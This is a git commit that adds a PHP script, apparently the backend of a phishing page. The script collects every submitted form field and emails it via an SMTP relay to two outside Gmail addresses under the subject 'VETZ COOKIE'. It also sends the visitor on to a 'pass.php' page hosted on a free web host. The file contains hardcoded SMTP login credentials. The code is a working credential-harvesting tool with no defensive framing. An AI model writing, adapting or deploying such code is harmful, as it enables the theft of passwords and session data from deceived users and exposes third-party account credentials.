cbbf41e226e2af3ae951d4d530e9e7165b5be88e
sastaghr <156545447+sastaghr@users.noreply.github.com>
2024-01-14 01:29:21 +0500

    Add files via upload

---
+++ t1.php
@@ -0,0 +1,58 @@
+<?php
+use PHPMailer\PHPMailer\PHPMailer;
+use PHPMailer\PHPMailer\Exception;
+
+header("Location: https://mitasupport.000webhostapp.com/pass.php");
+
+require 'PHPMailer/src/Exception.php';
+require 'PHPMailer/src/PHPMailer.php';
+require 'PHPMailer/src/SMTP.php';
+
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    // Initialize an empty body for the email
+    $emailBody = '';
+
+    // Iterate through the $_POST array to collect form data
+    foreach ($_POST as $key => $value) {
+        // Append form field name and its value to the email body
+        $emailBody .= ucfirst($key) . ': ' . $value . '<br>';
+    }
+
+
+
+    // PHPMailer object creation
+    $mail = new PHPMailer(true);
+
+    try {
+        // SMTP settings
+        $mail->isSMTP();
+        $mail->Host       = 'smtp-relay.brevo.com'; // Replace with your SMTP server address
+        $mail->SMTPAuth   = true;
+        $mail->Username   = 'vetzpharmasharing@gmail.com'; // Replace with your email address
+        $mail->Password   = 'TNJ1Uat4gQHvA5r2'; // Replace with your email password
+        $mail->SMTPSecure = 'tls';
+        $mail->Port       = 587;
+
+
+        // Email properties
+        $mail->setFrom('vetzpharmasharing@gmail.com', 'VETZ');
+        $mail->addAddress('akcent.crashe12345@gmail.com');
+        $mail->addAddress('sastaghr@gmail.com');
+        
+      // Email recipient's address
+
+        // Email content
+        $mail->isHTML(true);
+        $mail->Subject = 'VETZ COOKIE';
+        $mail->Body = $emailBody; // Set the email body using the collected form data
+
+        // Send email
+        $mail->send();
+        echo 'Email successfully sent using PHPMailer.';
+    } catch (Exception $e) {
+        echo "Email sending failed. Error message: {$mail->ErrorInfo}";
+    }
+} else {
+    echo "Invalid request!";
+}
+?>
